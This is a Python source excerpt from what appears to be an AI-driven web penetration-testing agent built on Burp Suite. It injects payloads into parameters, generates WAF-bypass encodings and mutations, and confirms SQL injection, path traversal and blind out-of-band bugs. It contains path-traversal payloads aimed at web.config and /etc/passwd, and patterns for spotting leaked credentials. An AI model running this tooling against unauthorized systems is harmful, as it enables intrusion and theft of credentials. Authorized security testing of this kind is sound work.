                            "[llm_burp] ExploitArsenal +%d %s payloads for %s[%s]",
                            len(arsenal_specs), _vuln_class, param_name, param_location,
                        )
            except Exception as _ea_exc:
                log.debug("[llm_burp] ExploitArsenal supplement failed (non-fatal): %s", _ea_exc)
    
            if not payloads:
                return  # no payloads to test — exit _test_one
            # For reflection-based tests (XSS, SQLi, SSTI), also test URL-encoded
            # and double-URL-encoded variants to detect WAF bypass opportunities.
            if burp_available and client:
                from pentra_agent.utils.burp_utils import encode_payload_for_injection as _enc_fn
                _bypass_additions: list[dict] = []
                for _ps in payloads[:2]:   # limit to first 2 payloads to avoid burst
                    _raw = str(_ps.get("injected_value", _ps.get("payload", "")))
                    _ttype = _ps.get("test_type", "")
                    if not _raw or _ps.get("uses_collaborator") or "time" in _ttype:
                        continue   # skip OOB / time-based payloads
                    for _enc_type in ("url", "double_url"):
                        try:
                            _encoded = await _enc_fn(client, _raw, _enc_type)
                            if _encoded and _encoded != _raw:
                                _bypass_additions.append({
                                    **_ps,
                                    "injected_value": _encoded,
                                    "payload": _encoded,
                                    "test_type": _ttype + f"_waf_{_enc_type}",
                                    "detection_hint": (
                                        f"WAF bypass via {_enc_type} encoding. "
                                        + _ps.get("detection_hint", "")
                                    ),
                                    "uses_collaborator": False,
                                })
                        except Exception:
                            pass
                if _bypass_additions:
                    log.info(
                        "[llm_burp] +%d WAF bypass variants for %s[%s]",
                        len(_bypass_additions), param_name, param_location,
                    )
                    payloads = list(payloads) + _bypass_additions
    
            # ── PayloadMutator: generate WAF-bypass variants per payload ─────────
            # Bug Fix 3: log always fires (before dedup check) so visibility is guaranteed.
            if _PAYLOAD_MUTATOR is not None:
                try:
                    _waf_type = state.get("waf_info", {}).get("waf_type") if isinstance(state, dict) else None
                    _mutated_specs: list[dict] = []
                    _mutation_count = 0
                    for _ps in (payloads or []):
                        _base = str(_ps.get("injected_value", _ps.get("payload", "")))
                        _ttype = _ps.get("test_type", "")
                        if not _base or _ps.get("uses_collaborator") or "time" in _ttype:
                            _mutated_specs.append(_ps)
                            continue
                        _mr = _PAYLOAD_MUTATOR.mutate(_base, waf_type=_waf_type)
                        _mutated_specs.append(_ps)
                        for _variant in _mr.mutations[:3]:   # cap at 3 extra variants per payload
                            if _variant != _base:
                                _mutated_specs.append({
                                    **_ps,
                                    "injected_value": _variant,
                                    "payload": _variant,
                                    "test_type": _ttype + "_mutated",
                                    "detection_hint": f"PayloadMutator variant (WAF={_waf_type}). " + _ps.get("detection_hint", ""),
                                })
                                _mutation_count += 1
                    # Always log — shows PayloadMutator is active even if dedup removes overlap
                    log.info(
                        "[PayloadMutator] %d mutations generated for %s[%s] (WAF: %s)",
                        _mutation_count, param_name, param_location, _waf_type or "none",
                    )
                    if len(_mutated_specs) > len(payloads or []):
                        log.info(
                            "[PayloadMutator] expanded %d → %d payloads for %s[%s]",
                            len(payloads or []), len(_mutated_specs), param_name, param_location,
                        )
                        payloads = _mutated_specs
                except Exception as _pm_exc:
                    log.warning("[PayloadMutator] failed (non-fatal): %s", _pm_exc)

            log.info("[llm_burp] Testing %d payloads on %s[%s]", len(payloads), param_name, param_location)

            # Send each payload
            for payload_spec in payloads[:_MAX_PAYLOADS_PER_CANDIDATE]:  # preset-controlled cap
                test_payload = str(payload_spec.get("injected_value", payload_spec.get("payload", "")))
                test_type = payload_spec.get("test_type", "unknown")
                detection_hint = payload_spec.get("detection_hint", "")
                uses_collab = payload_spec.get("uses_collaborator", False)
    
                if not test_payload:
                    continue
    
                # Sanitize: LLM sometimes returns "param=value" instead of just "value".
                # Strip the leading "<param_name>=" prefix if present so that
                # _inject_payload doesn't double-encode it as "?id=id%3Dvalue".
                _prefix = f"{param_name}="
                if test_payload.startswith(_prefix):
                    test_payload = test_payload[len(_prefix):]  # noqa: PLW2901 (intentional rebind)
    
                try:
                    test_url, test_method, test_body, test_headers = _inject_payload(
                        url=cand_url,
                        method=cand_method,
                        param_name=param_name,
                        param_location=param_location,
                        payload_value=test_payload,
                    )
                    enforcer.validate_or_raise(test_url)
                    await asyncio.sleep(_PAYLOAD_PACING_S)  # polite pacing (Task 18.9: reduced)
                    _t1 = _time.monotonic()
                    if burp_available and client:
                        test_raw_req, test_response = await client.send_request(
                            test_url,
                            method=test_method,
                            body=test_body,
                            headers={**(_auth_headers or {}), **(test_headers or {})},
                            cookies=_auth_cookies or None,
                        )
                    else:
                        test_raw_req, test_response = await _direct_request(
                            test_url,
                            method=test_method,
                            body=test_body,
                            headers={**(_auth_headers or {}), **(test_headers or {})},
                        )
                    _test_time = _time.monotonic() - _t1
                except ScopeViolationError:
                    continue
                except Exception as exc:
                    log.debug("[llm_burp] payload send failed: %s", exc)
                    continue
    
                # Enhancement E — Anomaly detection before LLM analysis
                anomalies = detect_anomalies(
                    baseline_body=original_response,
                    test_body=test_response,
                    test_payload=test_payload,
                    baseline_time_s=_baseline_time,
                    test_time_s=_test_time,
                )

                # ResponseBaseline: multi-dimensional behavioral scoring supplement
                _rbs = None
                if _endpoint_baseline is not None:
                    try:
                        _rbs = _endpoint_baseline.score_from_strings(
                            url=cand_url,
                            param=param_name,
                            test_body=test_response,
                            test_elapsed_ms=_test_time * 1000,
                        )
                        if _rbs.confirmed and _rbs.evidence:
                            anomalies = list(anomalies) + [
                                f"BASELINE_ANOMALY[{_rbs.score}]: {e}" for e in _rbs.evidence
                            ]
                            log.info(
                                "[baseline] Score %d (confirmed=%s) for %s[%s]",
                                _rbs.score, _rbs.confirmed, cand_url, param_name,
                            )
                    except Exception as _rbe:
                        log.debug("[vuln_hunt] ResponseBaseline scoring failed (non-fatal): %s", _rbe)

                # ── Bug Fix 2: SQLiProver early trigger ────────────────────────────────
                # Run SQLiProver when ResponseBaseline detects anomaly (score >= 40) on a
                # SQLi test payload — BEFORE LLM decision so proof gates confirmation.
                _is_sqli_test = any(
                    kw in test_type.lower() for kw in ("sqli", "sql_injection", "sql")
                ) or any(
                    kw in (tt.lower()) for tt in test_types for kw in ("sqli", "sql_injection", "sql")
                )
                if (
                    _rbs is not None and _rbs.confirmed
                    and _is_sqli_test
                    and _SQLI_PROVER_AVAILABLE and _SQLiProver is not None
                ):
                    try:
                        import httpx as _httpx_sp
                        _db_type_sp = None
                        if tech_stack:
                            _ts_lower_sp = [t.lower() for t in tech_stack]
                            if any("mssql" in t or "asp" in t or "sqlserver" in t for t in _ts_lower_sp):
                                _db_type_sp = "mssql"
                            elif any("mysql" in t or "php" in t for t in _ts_lower_sp):
                                _db_type_sp = "mysql"
                            elif any("postgres" in t for t in _ts_lower_sp):
                                _db_type_sp = "postgresql"
                        async with _httpx_sp.AsyncClient(
                            verify=False, follow_redirects=True, timeout=12.0
                        ) as _sp_client:
                            _sp_instance = _SQLiProver(timeout=10.0)
                            _early_proof = await _sp_instance.prove(
                                _sp_client, cand_url, param_name,
                                db_type=_db_type_sp,
                                original_value=str(original_value) if original_value else "1",
                            )
                        log.info(
                            "[SQLiProver] proof_type=%s confidence=%d confirmed=%s for %s[%s]",
                            _early_proof.proof_type, _early_proof.confidence,
                            _early_proof.confirmed, cand_url, param_name,
                        )
                        if _early_proof.confirmed:
                            # ResponseBaseline + SQLiProver both confirmed → CONFIRMED finding
                            _sp_finding = {
                                "title": f"SQL Injection in {param_name} (SQLiProver verified)",
                                "description": (
                                    f"SQLiProver confirmed via {_early_proof.proof_type}.\n"
                                    f"Evidence: {_early_proof.evidence}\n"
                                    f"Payload: {test_payload!r}\n"
                                    f"Parameter: {param_name} ({param_location})\n"
                                    f"Anomaly score: {_rbs.score}/100 — {', '.join(_rbs.evidence)}"
                                ),
                                "severity": normalize_severity("high"),
                                "target_url": cand_url,
                                "vuln_class": "SQL Injection",
                                "source": "sqli_prover",
                                "param_name": param_name,
                                "param_location": param_location,
                                "payload": test_payload,
                                "proof_type": _early_proof.proof_type,
                                "proof_evidence": _early_proof.evidence,
                                "proof_confidence": _early_proof.confidence,
                                "proof_confirmed": True,
                                "proof_requests": _early_proof.request_count,
                                "baseline_anomaly_score": _rbs.score,
                            }
                            confirmed_findings.append(_sp_finding)
                            memory.mark_confirmed(cand_url, param_name, _sp_finding)
                            log.info(
                                "[SQLiProver] CONFIRMED SQLi at %s[%s] — breaking",
                                cand_url, param_name,
                            )
                            break  # one confirmed finding per candidate
                        else:
                            # Anomaly found but prover inconclusive → CANDIDATE (don't confirm)
                            anomalies = list(anomalies) + [
                                f"SQLIPROVER_CANDIDATE: {_early_proof.proof_type} inconclusive "
                                f"(conf={_early_proof.confidence})"
                            ]
                    except Exception as _sp_exc:
                        log.debug("[SQLiProver] early trigger failed (non-fatal): %s", _sp_exc)

                if anomalies:
                    log.info("[llm_burp] Anomalies detected for %s[%s]: %s", cand_url, param_name, anomalies)
                    detection_hint = (
                        detection_hint + "\n\nANOMALY SIGNALS:\n" + "\n".join(f"- {a}" for a in anomalies)
                    ).strip()

                # Fix 2 — Fast-path LFI confirmation.
                # When PATH_INCLUSION anomaly fires on an LFI-candidate param, probe
                # deeper traversal payloads directly rather than relying solely on LLM
                # judgment (which historically misses web.config exposure).
                if any("PATH_INCLUSION" in a for a in anomalies) and _is_lfi_candidate(
                    param_name, original_value
                ):
                    log.info(
                        "[llm_burp] PATH_INCLUSION on %s[%s] — running LFI confirmation sequence",
                        cand_url, param_name,
                    )
                    _lfi_finding = await _confirm_lfi(
                        base_url=cand_url,
                        param_name=param_name,
                        param_location=param_location,
                        burp=client if burp_available else None,
                        enforcer=enforcer,
                    )
                    if _lfi_finding:
                        confirmed_findings.append(_lfi_finding)
                        if burp_available and client:
                            await _save_interesting_request_to_repeater(
                                burp=client,
                                url=cand_url,
                                request=_lfi_finding["request"],
                                finding_title=f"[CRITICAL] LFI — {param_name}",
                            )
                        break  # one confirmed finding per candidate is enough
    
                # LLM analyzes response
                try:
                    analysis = await llm.analyze_exploit_response(
                        test_type=test_type,
                        payload=test_payload,
                        detection_hint=detection_hint,
                        original_response=original_response,
                        test_response=test_response,
                        url=cand_url,
                        param_name=param_name,
                    )
                except Exception as exc:
                    log.warning("[llm_burp] analyze_exploit_response failed: %s", exc)
                    continue
    
                if analysis.get("confirmed"):
                    vuln_class = analysis.get("vuln_class", test_type.upper())
                    severity = normalize_severity(analysis.get("severity", "medium"))

                    # ── SQLiProver: proof-based verification for SQLi (LLM-confirm path) ──
                    # This path only runs if early SQLiProver (Bug Fix 2) did NOT already
                    # confirm via ResponseBaseline — i.e., when anomaly score was < 40.
                    _proof_metadata: dict = {}
                    _is_sqli = any(kw in (vuln_class or "").lower() for kw in ("sqli", "sql_injection", "sql"))
                    # Skip if early trigger already handled this (avoids double-run)
                    _early_proof_ran = (
                        _rbs is not None and _rbs.confirmed and _is_sqli_test
                        and _SQLI_PROVER_AVAILABLE and _SQLiProver is not None
                    )
                    if _SQLI_PROVER_AVAILABLE and _SQLiProver is not None and _is_sqli and not _early_proof_ran:
                        try:
                            import httpx as _httpx_prover
                            _db_type = None
                            if tech_stack:
                                _ts_lower = [t.lower() for t in tech_stack]
                                if any("mssql" in t or "asp" in t or "sqlserver" in t for t in _ts_lower):
                                    _db_type = "mssql"
                                elif any("mysql" in t or "php" in t for t in _ts_lower):
                                    _db_type = "mysql"
                                elif any("postgres" in t for t in _ts_lower):
                                    _db_type = "postgresql"
                            async with _httpx_prover.AsyncClient(
                                verify=False, follow_redirects=True, timeout=12.0
                            ) as _prover_client:
                                _prover = _SQLiProver(timeout=10.0)
                                _proof = await _prover.prove(
                                    _prover_client, cand_url, param_name,
                                    db_type=_db_type, original_value=original_value,
                                )
                            log.info(
                                "[SQLiProver] proof_type=%s confidence=%d confirmed=%s for %s[%s]",
                                _proof.proof_type, _proof.confidence, _proof.confirmed,
                                cand_url, param_name,
                            )
                            _proof_metadata = {
                                "proof_type": _proof.proof_type,
                                "proof_evidence": _proof.evidence,
                                "proof_confidence": _proof.confidence,
                                "proof_confirmed": _proof.confirmed,
                                "proof_requests": _proof.request_count,
                            }
                            if not _proof.confirmed:
                                log.info(
                                    "[SQLiProver] LLM confirmed but prover inconclusive (%s) — downgrading to CANDIDATE for %s[%s]",
                                    _proof.proof_type, cand_url, param_name,
                                )
                                _proof_metadata["status"] = "CANDIDATE"
                            else:
                                log.info(
                                    "[SQLiProver] PROOF OK (%s, conf=%d) for %s[%s]",
                                    _proof.proof_type, _proof.confidence, cand_url, param_name,
                                )
                        except Exception as _pe:
                            log.debug("[SQLiProver] proof attempt failed (non-fatal): %s", _pe)

                    log.info(
                        "[llm_burp] CONFIRMED [%s] %s param=%r payload=%r",
                        severity.upper(), vuln_class, param_name, test_payload[:50],
                    )
                    finding = {
                        "title": f"{vuln_class} in {param_name} parameter",
                        "description": (
                            f"{analysis.get('evidence', '')}\n\n"
                            f"Payload: {test_payload!r}\n"
                            f"Parameter: {param_name} ({param_location})"
                        ),
                        "severity": severity,
                        "target_url": cand_url,
                        "vuln_class": vuln_class,
                        "request": test_raw_req,
                        "response": test_response[:3000],
                        "source": "llm_active" if not burp_available else "llm_burp_active",
                        "impact": analysis.get("impact", ""),
                        "remediation": analysis.get("remediation", ""),
                        "cvss_score": analysis.get("cvss_score"),
                        "param_name": param_name,
                        "param_location": param_location,
                        "payload": test_payload,
                        **(_proof_metadata if _proof_metadata else {}),
                    }
                    confirmed_findings.append(finding)
                    # Task 18.10: record confirmed finding in LocatedMemory
                    memory.mark_confirmed(cand_url, param_name, finding)
    
                    # Open in Burp Repeater (only when Burp available)
                    if burp_available and client:
                        await _save_interesting_request_to_repeater(
                            burp=client,
                            url=cand_url,
                            request=test_raw_req,
                            finding_title=f"[{severity.upper()}] {vuln_class} – {param_name}",
                        )
                        # For SQLi, also set up Intruder so researcher can launch full fuzz
                        if vuln_class in ("SQLI", "SQLi", "sql_injection") or "sqli" in test_type:
                            await _setup_intruder_for_sqli(
                                burp=client,
                                scope=enforcer,
                                url=cand_url,
                                param=param_name,
                                base_request=test_raw_req,
                            )
    
                    break  # one confirmed finding per candidate is enough

                elif uses_collab and collab_payload_id:
                    blind_payload_ids.append((collab_payload_id, candidate))
                else:
                    # No finding, no OOB — record payload as failed
                    memory.mark_failed_payload(cand_url, param_name, test_payload)

            # After all payloads tested: if no confirmed finding, mark exhausted
            if not memory.is_confirmed(cand_url, param_name):
                memory.mark_exhausted(cand_url, param_name)
                log.debug("[memory] Exhausted: %s[%s]", cand_url, param_name)

            # Task 18.13: update incremental fingerprint with baseline response
            _incremental.update(
                cand_url, param_name, original_response,
                vuln_found=memory.is_confirmed(cand_url, param_name),
            )
    await asyncio.gather(*[_test_one(c) for c in candidates[:_MAX_CANDIDATES]], return_exceptions=True)
    log.info(
        "[memory] Stats: confirmed=%d exhausted=%d effective_classes=%s",
        memory.stats["confirmed"], memory.stats["exhausted"],
        memory.stats["effective_payload_classes"],
    )
    # Task 18.13: persist incremental fingerprint cache
    _incremental.save()
    log.info("[incremental] Stats: %s", _incremental.stats)

    # Task 18.14: Export confirmed findings as fine-tuning data
    if confirmed_findings:
        try:
            from pentra_agent.finetune_export import FineTuneExporter
            _ft = FineTuneExporter()
            _ft.export_from_state(
                {"findings": confirmed_findings, "tech_stack": tech_stack, "engagement_id": engagement_id},
                memory=memory,
            )
            _ft.save(append=True)
        except Exception as _ft_exc:
            log.debug("[finetune] Export failed (non-fatal): %s", _ft_exc)

    # ── Step 9: Poll Collaborator for OOB hits (Burp Pro only) ───────────────
    if burp_available and client and blind_payload_ids and collab_payload_id:
        log.info("[llm_burp] Waiting 10s then polling Collaborator for OOB hits...")
        await asyncio.sleep(10)
        try:
            interactions = await client.poll_collaborator(payload_id=collab_payload_id)
            if interactions:
                log.info("[llm_burp] Collaborator: %d OOB interaction(s) detected!", len(interactions))
                for interaction in interactions:
                    candidate = blind_payload_ids[0][1] if blind_payload_ids else {}
                    confirmed_findings.append({
                        "title": f"Blind Out-of-Band Interaction ({interaction.interaction_type or 'DNS/HTTP'})",
                        "description": (
                            f"Burp Collaborator received an OOB interaction from the target.\n"
                            f"Interaction type: {interaction.interaction_type}\n"
                            f"Client IP: {interaction.client_ip}\n"
                            f"Collaborator payload: {collab_url}\n"
                            f"This confirms a blind SSRF, blind XSS, XXE, or SSTI vulnerability."
                        ),
                        "severity": "high",
                        "target_url": candidate.get("url", f"http://{domain}"),
                        "vuln_class": "SSRF" if interaction.interaction_type in ("http", "https") else "Blind Injection",
                        "request": "",
                        "response": str(interaction),
                        "source": "burp_collaborator_oob",
                        "impact": "Server-Side Request Forgery or blind code execution allowing internal network access",
                        "remediation": "Validate and whitelist all user-controlled URLs. Disable unnecessary outbound HTTP from server.",
                        "cvss_score": 8.1,
                    })
        except BurpNotProError:
            log.info("[llm_burp] Collaborator polling requires Pro")
        except Exception as exc:
            log.warning("[llm_burp] Collaborator poll error: %s", exc)

    log.info(
        "[llm_burp] LLM active testing complete: %d confirmed findings",
        len(confirmed_findings),
    )
    # Close the persistent SSE session opened at function start (if any)
    if _burp_session_cm is not None:
        import contextlib as _cl
        with _cl.suppress(Exception):
            await _burp_session_cm.__aexit__(None, None, None)  # type: ignore[misc]
    return confirmed_findings


# ── Enhancement D — Developer Psychology Heuristics ──────────────────────────

DEVELOPER_PSYCHOLOGY_HEURISTICS = """
## Developer Psychology — Where Developers Make Mistakes

1. **API versioning**: /api/v1/ often auth-checked; /api/v2/ or /api/v3/ added quickly
   may skip authorization. Always test v1 vs v2 side-by-side.
2. **Frontend trust**: Developers trust client-side validation. Look for params that
   should be validated server-side but rely only on browser checks.
3. **Integer ID = IDOR candidate**: Numeric IDs in URLs are almost always IDOR
   candidates — developers assume users won't guess other users' IDs.
4. **Admin/internal endpoints**: /admin/, /api/admin/, /internal/, /management/
   often have weaker auth because "it's internal only".
5. **Debug/test endpoints**: /debug/, /test/, /health/, /_debug/ often leak more
   than intended (stack traces, env vars, internal IPs).
6. **Copy-paste auth bypass**: New features copy old code. Check if deprecated auth
   patterns (e.g., API key in URL param) coexist with newer JWT auth.
7. **Missing function-level auth**: Object-level checks present but function-level
   (view vs edit vs delete) often missed on API endpoints.
8. **Verbose errors in production**: Developers leave debug error messages that
   expose DB queries, file paths, or internal IPs.
""".strip()


# ── Enhancement E — Anomaly Detection ────────────────────────────────────────

_ANOMALY_ERROR_KEYWORDS = [
    "sql syntax", "mysql error", "ora-", "pg::", "sqlite",
    "traceback", "exception", "stack trace", "undefined",
    "null pointer", "cannot read property", "unhandled",
    "you have an error in your sql", "warning: mysql",
    "odbc driver", "jdbc", "jdbc error",
    # MSSQL / ASP.NET specific
    "unclosed quotation mark", "incorrect syntax near", "conversion failed",
    "sqlexception", "server error in '/' application",
    "microsoft ole db", "microsoft jet", "adodb", "system.data.sqlclient",
    "sqlserver", "mssqlserver", "invalid column name", "invalid object name",
]

# ── Fix 2 — LFI / Path Traversal heuristics ──────────────────────────────────

# Parameter names that commonly carry file paths (case-insensitive exact or partial match).
LFI_PRONE_PARAM_NAMES: list[str] = [
    "file", "path", "page", "template", "include", "load", "read",
    "doc", "document", "view", "news", "article", "feed", "content",
    "newsad", "ad", "src", "source", "dir", "folder", "location",
    "img", "image", "module", "url", "style", "layout", "config",
    "resource", "lang", "language", "locale", "theme",
]

# Positive indicators that sensitive file content was returned in the response body.
# Each tuple is (regex_pattern, human_readable_label).
_LFI_CONFIRMATION_PATTERNS: list[tuple[str, str]] = [
    (r"<connectionStrings", "web.config <connectionStrings>"),
    (r"<appSettings", "web.config <appSettings>"),
    (r"data\s+source\s*=", "connection string 'data source='"),
    (r"initial\s+catalog\s*=", "connection string 'initial catalog='"),
    (r"user\s+id\s*=", "connection string 'user id='"),
    (r"(?<!=)password\s*=[^&\s]{3}", "connection string 'password='"),
    (r"root:x:0:0", "Unix /etc/passwd root entry"),
    (r"daemon:[^\n]+:/bin", "Unix /etc/passwd daemon entry"),
    (r"\[boot\s+loader\]", "Windows boot.ini [boot loader]"),
    (r"\[fonts\]", "Windows win.ini [fonts]"),
    (r"for 16-bit app support", "Windows win.ini marker"),
    (r"<\?xml[^>]*encoding", "XML config file header"),
]

# LFI traversal payloads — ordered shallow → deep, Windows + Linux.
_LFI_TRAVERSAL_PAYLOADS: list[str] = [
    "../web.config",
    "../../web.config",
    "../../../web.config",
    "..\\web.config",
    "..%2fweb.config",
    "%2e%2e%2fweb.config",
    "....//web.config",
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "..%2fetc%2fpasswd",
]


def _is_lfi_candidate(param: str, value: str | None) -> bool:
    """Return True if the parameter is a likely LFI / path-traversal candidate.

    Checks parameter name against LFI_PRONE_PARAM_NAMES (exact or partial,
    case-insensitive) and also inspects the original value for path separators
    or file extensions that suggest a user-controlled file path.
    """
    param_lower = (param or "").lower()
    value = value or ""  # guard against None from LLM-generated candidates
    # Exact or partial match against known LFI-prone names
    if any(name == param_lower for name in LFI_PRONE_PARAM_NAMES):
        return True
    if any(name in param_lower for name in LFI_PRONE_PARAM_NAMES):
        return True
    # Value carries path separators → likely a file path param
    if any(c in value for c in ("/", "\\")):
        return True
    # Value ends with a file extension → file path param
    _file_exts = (
        ".asp", ".aspx", ".php", ".html", ".htm", ".txt",
        ".xml", ".config", ".ini", ".cfg", ".log", ".bak", ".conf",
    )
    if any(value.lower().endswith(ext) for ext in _file_exts):
        return True
    return False


async def _confirm_lfi(
    base_url: str,
    param_name: str,
    param_location: str,
    burp: "BurpMCPClient | None",
    enforcer: "ScopeEnforcer",
) -> "dict | None":
    """Attempt to confirm LFI by probing deeper traversal payloads.

    Iterates over _LFI_TRAVERSAL_PAYLOADS, sends each via Burp (preferred) or
    direct httpx, then checks the response body against _LFI_CONFIRMATION_PATTERNS.
    Returns a confirmed finding dict on the first match, or None.
    """
    import re as _re

    for lfi_payload in _LFI_TRAVERSAL_PAYLOADS:
        try:
            test_url, test_method, test_body_str, test_headers = _inject_payload(
                url=base_url,
                method="GET",
                param_name=param_name,
                param_location=param_location,
                payload_value=lfi_payload,
            )
            enforcer.validate_or_raise(test_url)
            await asyncio.sleep(0.3)  # polite pacing

            if burp is not None:
                raw_req, resp_body = await burp.send_request(
                    test_url,
                    method=test_method,
                    body=test_body_str,
                    headers=test_headers,
                )
            else:
                raw_req, resp_body = await _direct_request(
                    test_url,
                    method=test_method,
                    body=test_body_str,
                    headers=test_headers,
                )

            for pattern, label in _LFI_CONFIRMATION_PATTERNS:
                if _re.search(pattern, resp_body, _re.IGNORECASE):
                    log.info(
                        "[lfi_confirm] LFI CONFIRMED %s[%s] payload=%r  matched=%s",
                        base_url, param_name, lfi_payload, label,
                    )
                    return {
                        "title": f"Local File Inclusion — {label} Exposed",
                        "description": (
                            f"LFI confirmed: parameter '{param_name}' allows path traversal.\n"
                            f"Payload '{lfi_payload}' caused '{label}' to appear in the response.\n"
                            "Sensitive configuration data may be exposed."
                        ),
                        "severity": "critical",
                        "target_url": base_url,
                        "vuln_class": "PATH_TRAVERSAL",
                        "request": raw_req,
                        "response": resp_body[:3000],
                        "source": "lfi_confirmation",
                        "impact": (
                            "Attacker can read arbitrary server files including configuration "
                            "files, credentials, private keys, and source code."
                        ),
                        "remediation": (
                            "Never use user-controlled input directly as a file path. "
                            "Whitelist allowed files, use indirect references (map ID→path), "
                            "and run the application with minimal filesystem permissions."
                        ),
                        "cvss_score": 9.1,
                        "param_name": param_name,
                        "param_location": param_location,
                        "payload": lfi_payload,
                    }
        except ScopeViolationError:
            continue
        except Exception as _exc:
            log.debug("[lfi_confirm] payload %r failed: %s", lfi_payload, _exc)
            continue

    return None


def detect_anomalies(
    baseline_body: str,
    test_body: str,
    test_payload: str = "",
    baseline_time_s: float = 0.0,
    test_time_s: float = 0.0,
) -> list[str]:
    """Detect anomalies between baseline and injected response bodies.

    Used by Enhancement E — returns a list of anomaly description strings
    suitable for feeding into the LLM analysis context.

    Args:
        baseline_body:    Response body before payload injection.
        test_body:        Response body after payload injection.
        test_payload:     The injected payload string (for reflection detection).
        baseline_time_s:  Wall-clock seconds for baseline request.
        test_time_s:      Wall-clock seconds for injected request.

    Returns:
        List of anomaly description strings (empty list = no anomalies).
    """
    anomalies: list[str] = []

    baseline_len = len(baseline_body)
    test_len = len(test_body)

    # 1. Response size anomaly — potential data disclosure or error
    size_diff = abs(test_len - baseline_len)
    if baseline_len > 0 and size_diff > 500 and size_diff / baseline_len > 0.3:
        direction = "larger" if test_len > baseline_len else "smaller"
        anomalies.append(
            f"SIZE_ANOMALY: Response is {size_diff} bytes {direction} than baseline "
            f"({test_len} vs {baseline_len}) — potential data disclosure or error message"
        )
    elif baseline_len == 0 and test_len > 500:
        anomalies.append(
            f"SIZE_ANOMALY: Empty baseline but injected response is {test_len} bytes — "
            "unexpected data returned"
        )

    # 2. Error keyword disclosure — potential injection confirmation
    test_lower = test_body.lower()
    found_errors = [kw for kw in _ANOMALY_ERROR_KEYWORDS if kw in test_lower]
    baseline_lower = baseline_body.lower()
    # Only flag if keyword appeared in test but NOT in baseline
    new_errors = [kw for kw in found_errors if kw not in baseline_lower]
    if new_errors:
        anomalies.append(
            f"ERROR_DISCLOSURE: New error keyword(s) in injected response: "
            f"{new_errors[:3]} — potential injection or debug info disclosure"
        )

    # 3. Payload reflection — XSS / SSTI candidate
    if test_payload and len(test_payload) >= 4:
        # Check for reflected payload that wasn't in baseline
        if test_payload in test_body and test_payload not in baseline_body:
            # Distinguish generic reflection from src/href path injection
            import re as _re
            _path_in_src = _re.search(
                r'(?:src|href|action|data)=["\']' + _re.escape(test_payload),
                test_body,
                _re.IGNORECASE,
            )
            if _path_in_src:
                anomalies.append(
                    f"PATH_INCLUSION: Payload appears verbatim as a resource path "
                    f"attribute (src/href/action) — user-controlled path / LFI candidate. "
                    f"Context: {test_body[max(0,_path_in_src.start()-30):_path_in_src.end()+30]!r}"
                )
            else:
                anomalies.append(
                    f"REFLECTION: Payload reflected in response (not present in baseline) — "
                    f"XSS or SSTI candidate"
                )

    # 4. Response became empty when it wasn't before — potential auth bypass / error
    if baseline_len > 100 and test_len < 20:
        anomalies.append(
            "EMPTY_RESPONSE: Response became near-empty after injection — "
            "potential error condition or auth state change"
        )

    # 5. File content indicators — path traversal / LFI confirmation
    _FILE_PATTERNS = [
        (r"<connectionStrings", "web.config connectionStrings element"),
        (r"<appSettings", "web.config appSettings element"),
        (r"root:x:0:0", "Unix /etc/passwd root entry"),
        (r"\[boot loader\]", "Windows boot.ini"),
        (r"\[fonts\]", "Windows win.ini"),
        (r"for 16-bit app support", "Windows win.ini marker"),
        (r"<\?xml.*encoding", "XML config file header"),
    ]
    if test_payload and len(test_payload) >= 3:
        import re as _re
        for pattern, label in _FILE_PATTERNS:
            if _re.search(pattern, test_body, _re.IGNORECASE) and not _re.search(
                pattern, baseline_body, _re.IGNORECASE
            ):
                anomalies.append(
                    f"FILE_CONTENT: Response contains {label} — path traversal / "
                    f"LFI confirmed"
                )
                break

    # 6. Time-based detection — blind SQLi / command injection / SSRF
    if baseline_time_s > 0 and test_time_s > 0:
        time_delta = test_time_s - baseline_time_s
        # 4.5s threshold: WAITFOR DELAY '0:0:5' should push over this
        if time_delta >= 4.5:
            anomalies.append(
                f"TIME_ANOMALY: Response took {test_time_s:.1f}s vs baseline "
                f"{baseline_time_s:.1f}s (+{time_delta:.1f}s) — "
                f"consistent with WAITFOR/SLEEP time-based blind injection"
            )
        elif time_delta >= 2.5:
            anomalies.append(
                f"TIME_SOFT: Response {time_delta:.1f}s slower than baseline — "
                f"possible time-based injection (confirm with WAITFOR 10s payload)"
            )

    # 7. HTTP status code change — potential auth bypass, forbidden bypass, redirect
    _baseline_status = None
    _test_status = None
    import re as _re
    _sm = _re.match(r"HTTP[/ ][\d.]+\s+(\d{3})", baseline_body)
    if _sm:
        _baseline_status = int(_sm.group(1))
    _tm2 = _re.match(r"HTTP[/ ][\d.]+\s+(\d{3})", test_body)
    if _tm2:
        _test_status = int(_tm2.group(1))
    if _baseline_status and _test_status and _baseline_status != _test_status:
        _interesting = {
            (403, 200): "AUTHZ_BYPASS: 403→200 after injection — potential authorization bypass",
            (401, 200): "AUTHN_BYPASS: 401→200 after injection — potential authentication bypass",
            (302, 200): "REDIRECT_BYPASS: 302→200 — redirect flow bypassed",
            (200, 500): "SERVER_ERROR: 200→500 — server error triggered (injection candidate)",
            (200, 403): "AUTHZ_CHANGE: 200→403 — unexpected auth restriction change",
        }
        msg = _interesting.get((_baseline_status, _test_status))
        if msg:
            anomalies.append(msg)
        else:
            anomalies.append(
                f"STATUS_CHANGE: HTTP {_baseline_status} → {_test_status} after injection"
            )

    return anomalies


def _inject_payload(
    url: str,
    method: str,
    param_name: str,
    param_location: str,
    payload_value: str,
) -> tuple[str, str, str, dict]:
    """Inject payload_value into the specified parameter location.

    Returns (modified_url, method, body, extra_headers).
    """
    from urllib.parse import urlparse, urlencode, parse_qs, urlunparse, quote

    body = ""
    extra_headers: dict = {}

    if param_location == "query":
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param_name] = [payload_value]
        new_query = urlencode(params, doseq=True)
        modified_url = urlunparse(parsed._replace(query=new_query))
        return modified_url, method, body, extra_headers

    elif param_location == "body":
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        # Move query params to body if POST
        if parsed.query:
            body_params = parse_qs(parsed.query, keep_blank_values=True)
            body_params[param_name] = [payload_value]
            body = urlencode(body_params, doseq=True)
            modified_url = urlunparse(parsed._replace(query=""))
        else:
            body = urlencode({param_name: payload_value})
            modified_url = url
        if method.upper() == "GET":
            method = "POST"
        extra_headers["Content-Type"] = "application/x-www-form-urlencoded"
        return modified_url, method, body, extra_headers

